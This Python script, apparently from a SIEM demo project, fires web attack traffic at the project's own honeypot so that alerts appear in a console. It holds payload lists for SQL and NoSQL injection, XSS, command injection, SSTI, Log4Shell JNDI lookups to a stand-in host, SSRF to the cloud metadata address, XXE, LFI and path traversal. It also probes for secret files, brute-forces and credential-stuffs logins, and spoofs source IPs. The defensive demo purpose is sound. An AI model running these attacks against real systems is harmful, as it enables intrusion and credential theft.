#!/usr/bin/env python3
"""Aegis demo attacker.

Drives realistic HTTP attacks at the deployed CloudJuice honeypot so the SIEM
produces findings organically - nothing is injected into the pipeline directly.
Standard library only, so it runs on any laptop.

Examples:
    python3 attack.py --target http://my-alb-123.us-east-1.elb.amazonaws.com
    python3 attack.py --target http://... --scenario campaign
    python3 attack.py --target http://... --scenario brute --source-ip 45.155.205.7

--scenario campaign replays attacks from many spoofed source countries (via the
X-Forwarded-For header only - those addresses are never contacted) so the
console's threat map and incident list fill up for a demo.
"""
import argparse
import json
import random
import time
import urllib.error
import urllib.parse
import urllib.request

# Real public IPs used ONLY as spoofed X-Forwarded-For values (never contacted),
# chosen to geolocate to a spread of countries so the threat map lights up.
SOURCES = [
    ("45.155.205.7", "NL"), ("185.220.101.5", "DE"), ("5.255.255.70", "RU"),
    ("103.86.96.100", "SG"), ("202.108.22.5", "CN"), ("200.147.67.1", "BR"),
    ("196.25.1.1", "ZA"), ("195.154.1.1", "FR"), ("203.104.153.1", "JP"),
    ("41.203.72.1", "KE"), ("8.8.8.8", "US"), ("1.1.1.1", "AU"),
]

SQLI = ["1' OR '1'='1", "1' OR 1=1 --", "1 UNION SELECT username,password FROM users",
        "'; DROP TABLE users; --", "admin'--"]
XSS = ["<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>",
       "<svg/onload=alert(1)>"]
CMD = ["; cat /etc/passwd", "| whoami", "&& id", "`ls -la`"]
SSTI = ["{{7*7}}", "${7*7}", "#{7*7}"]
LOG4SHELL = ["${jndi:ldap://attacker.example/a}", "${jndi:rmi://x/y}"]
SSRF = ["url=http://169.254.169.254/latest/meta-data/",
        "url=http://localhost:8080/admin", "next=http://10.0.0.5/"]
NOSQLI = ['{"$ne":null}', '{"$gt":""}']
XXE = ['<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>']
LFI = ["page=php://filter/convert.base64-encode/resource=index",
       "file=../../../../etc/passwd"]
TRAVERSAL = ["../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "/proc/self/environ"]
SENSITIVE = ["/.env", "/.git/config", "/wp-config.php", "/backup.sql",
             "/id_rsa", "/phpinfo.php", "/server-status"]
USERNAMES = ["admin@cloudjuice.io", "root@cloudjuice.io", "test@x.com",
             "jsmith@corp.com", "ceo@cloudjuice.io", "support@cloudjuice.io"]

UA_ATTACK = "aegis-redteam/2.0"
UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36"
UA_SCANNER = "sqlmap/1.7.11#stable (https://sqlmap.org)"


def req(target, path, method="GET", data=None, src_ip=None, ua=UA_ATTACK, timeout=8):
    url = target.rstrip("/") + path
    headers = {"User-Agent": ua}
    if src_ip:
        headers["X-Forwarded-For"] = src_ip
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:  # noqa
        return f"ERR:{e}"


def _q(p):
    return "/api/products/search?q=" + urllib.parse.quote(p)


def s_sqli(t, ip):
    print("[*] SQL injection (search + login)")
    for p in SQLI:
        print("    search", p[:28], "->", req(t, _q(p), src_ip=ip)); time.sleep(0.3)
    req(t, "/api/login", "POST", {"email": "admin'--", "password": "x"}, ip)


def s_xss(t, ip):
    print("[*] XSS (reflected search + stored review)")
    for p in XSS:
        print("    search ->", req(t, _q(p), src_ip=ip)); time.sleep(0.3)
    req(t, "/api/reviews", "POST",
        {"product": 1, "author": "hax", "text": XSS[0]}, ip)


def s_cmd(t, ip):
    print("[*] Command injection")
    for p in CMD:
        print("    ->", req(t, _q(p), src_ip=ip)); time.sleep(0.3)


def s_ssti(t, ip):
    print("[*] SSTI")
    for p in SSTI:
        print("    ->", req(t, _q(p), src_ip=ip)); time.sleep(0.3)


def s_log4shell(t, ip):
    print("[*] Log4Shell / JNDI")
    for p in LOG4SHELL:
        print("    ->", req(t, _q(p), src_ip=ip)); time.sleep(0.3)
    req(t, "/api/products", "GET", None, ip, ua=LOG4SHELL[0])


def s_ssrf(t, ip):
    print("[*] SSRF")
    for p in SSRF:
        print("    ->", req(t, _q(p), src_ip=ip)); time.sleep(0.3)


def s_nosqli(t, ip):
    print("[*] NoSQL injection (login)")
    for p in NOSQLI:
        print("    ->", req(t, "/api/login", "POST", {"email": p, "password": p}, ip)); time.sleep(0.3)


def s_xxe(t, ip):
    print("[*] XXE (register)")
    for p in XXE:
        print("    ->", req(t, "/api/register", "POST", {"email": "a@b.c", "profile": p}, ip)); time.sleep(0.3)


def s_lfi(t, ip):
    print("[*] LFI / RFI")
    for p in LFI:
        print("    ->", req(t, _q(p), src_ip=ip)); time.sleep(0.3)


def s_traversal(t, ip):
    print("[*] Path traversal (product id)")
    for p in TRAVERSAL:
        print("    ->", req(t, "/api/products/" + urllib.parse.quote(p), src_ip=ip)); time.sleep(0.3)


def s_idor(t, ip):
    print("[*] IDOR / broken access control")
    for bid in ("2", "3", "42"):
        print("    basket", bid, "->", req(t, "/api/basket/" + bid, src_ip=ip)); time.sleep(0.3)


def s_scanner(t, ip):
    print("[*] Automated scanner sweep (sqlmap UA)")
    for p in ["/api/products", "/admin", "/.env", "/api/login"]:
        print("    ", p, "->", req(t, p, src_ip=ip, ua=UA_SCANNER)); time.sleep(0.2)


def s_sensitive(t, ip):
    print("[*] Sensitive file probing")
    for p in SENSITIVE:
        print("    ", p, "->", req(t, p, src_ip=ip)); time.sleep(0.2)


def s_recon(t, ip):
    print("[*] Recon / enumeration")
    for p in ["/api/v1/users", "/console", "/debug", "/old", "/api/secret", "/admin"]:
        print("    ", p, "->", req(t, p, src_ip=ip)); time.sleep(0.2)


def s_brute(t, ip):
    print("[*] Brute force (one user, many passwords)")
    for i in range(12):
        req(t, "/api/login", "POST", {"email": "admin@cloudjuice.io", "password": f"Pass{i}!"}, ip)
        time.sleep(0.15)
    print("    12 failed logins for admin@cloudjuice.io")


def s_credstuff(t, ip):
    print("[*] Credential stuffing (many users, one IP)")
    for u in USERNAMES:
        req(t, "/api/login", "POST", {"email": u, "password": "Password1"}, ip)
        time.sleep(0.15)
    print(f"    failed logins for {len(USERNAMES)} distinct users")


def s_benign(t, ip):
    print("[*] Benign browsing (normal customer)")
    req(t, "/", ua=UA_BROWSER, src_ip=ip)
    req(t, "/api/products", ua=UA_BROWSER, src_ip=ip)
    req(t, _q("orange"), ua=UA_BROWSER, src_ip=ip)
    req(t, "/api/products/1", ua=UA_BROWSER, src_ip=ip)


ATTACKS = [s_sqli, s_xss, s_cmd, s_ssti, s_log4shell, s_ssrf, s_nosqli, s_xxe,
           s_lfi, s_traversal, s_idor, s_scanner, s_sensitive, s_recon]
SCENARIOS = {f.__name__[2:]: f for f in ATTACKS + [s_brute, s_credstuff, s_benign]}


def campaign(t):
    print("[*] CAMPAIGN: multi-source attack across countries\n")
    for ip, cc in SOURCES:
        print(f"=== source {ip} ({cc}) ===")
        s_benign(t, ip)
        for fn in random.sample(ATTACKS, random.randint(2, 4)):
            fn(t, ip)
        if random.random() < 0.4:
            (s_brute if random.random() < 0.5 else s_credstuff)(t, ip)
        print()
    print("[+] Campaign complete - open the console and explore.")


def run_all(t, ip):
    s_benign(t, ip)
    for fn in ATTACKS:
        fn(t, ip)
    s_brute(t, ip)
    s_credstuff(t, ip)


def main():
    ap = argparse.ArgumentParser(description="Aegis demo attacker")
    ap.add_argument("--target", required=True, help="CloudJuice base URL (the ALB DNS)")
    ap.add_argument("--scenario", default="campaign",
                    help="campaign | all | " + " | ".join(SCENARIOS))
    ap.add_argument("--source-ip", default=None, help="override X-Forwarded-For")
    args = ap.parse_args()
    ip = args.source_ip or random.choice(SOURCES)[0]

    if args.scenario == "campaign":
        campaign(args.target)
    elif args.scenario == "all":
        run_all(args.target, ip)
    elif args.scenario in SCENARIOS:
        SCENARIOS[args.scenario](args.target, ip)
    else:
        raise SystemExit(f"unknown scenario '{args.scenario}'. options: campaign, all, "
                         + ", ".join(SCENARIOS))
    print("\n[+] Done. Findings should appear in the console within a few seconds.")


if __name__ == "__main__":
    main()
